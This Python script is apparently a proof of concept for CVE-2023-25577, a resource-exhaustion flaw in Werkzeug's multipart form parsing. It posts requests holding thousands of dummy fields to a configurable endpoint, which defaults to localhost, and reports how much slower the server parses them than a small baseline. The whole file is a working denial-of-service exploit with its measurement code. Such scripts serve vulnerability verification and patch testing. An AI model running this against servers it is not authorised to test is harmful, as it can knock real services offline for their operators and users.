from __future__ import annotations

import argparse
import statistics
import time
from typing import Any

import httpx


def build_multipart_fields(field_count: int) -> list[tuple[str, tuple[None, str]]]:
    return [(f"field_{idx}", (None, "x")) for idx in range(field_count)]


def run_batch(client: httpx.Client, url: str, runs: int, field_count: int, timeout: float) -> dict[str, Any]:
    client_latencies_ms: list[float] = []
    server_parse_ms: list[float] = []

    for _ in range(runs):
        multipart_fields = build_multipart_fields(field_count)
        started = time.perf_counter()
        response = client.post(url, files=multipart_fields, timeout=timeout)
        latency_ms = round((time.perf_counter() - started) * 1000, 2)
        response.raise_for_status()
        payload = response.json()

        client_latencies_ms.append(latency_ms)
        server_parse_ms.append(float(payload["parse_ms"]))

    return {
        "runs": runs,
        "field_count": field_count,
        "client_avg_ms": round(statistics.mean(client_latencies_ms), 2),
        "client_max_ms": round(max(client_latencies_ms), 2),
        "server_parse_avg_ms": round(statistics.mean(server_parse_ms), 2),
        "server_parse_max_ms": round(max(server_parse_ms), 2),
    }


def ratio(numerator: float, denominator: float) -> float:
    if denominator <= 0:
        return 0.0
    return round(numerator / denominator, 2)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="PoC for Werkzeug multipart parsing resource-usage behavior (CVE-2023-25577)."
    )
    parser.add_argument("--url", default="http://localhost:8000/demo/upload-preview")
    parser.add_argument("--runs", type=int, default=3)
    parser.add_argument("--baseline-fields", type=int, default=20)
    parser.add_argument("--attack-fields", type=int, default=12000)
    parser.add_argument("--timeout", type=float, default=180.0)
    args = parser.parse_args()

    with httpx.Client() as client:
        baseline = run_batch(client, args.url, args.runs, args.baseline_fields, args.timeout)
        attack = run_batch(client, args.url, args.runs, args.attack_fields, args.timeout)

    print("=== CVE-2023-25577 PoC Results ===")
    print(f"Target endpoint: {args.url}")
    print("")
    print(
        f"Baseline ({baseline['field_count']} fields): "
        f"client_avg={baseline['client_avg_ms']} ms | server_parse_avg={baseline['server_parse_avg_ms']} ms"
    )
    print(
        f"Attack   ({attack['field_count']} fields): "
        f"client_avg={attack['client_avg_ms']} ms | server_parse_avg={attack['server_parse_avg_ms']} ms"
    )
    print("")
    print(
        "Amplification ratios: "
        f"client={ratio(attack['client_avg_ms'], baseline['client_avg_ms'])}x | "
        f"server_parse={ratio(attack['server_parse_avg_ms'], baseline['server_parse_avg_ms'])}x"
    )


if __name__ == "__main__":
    main()
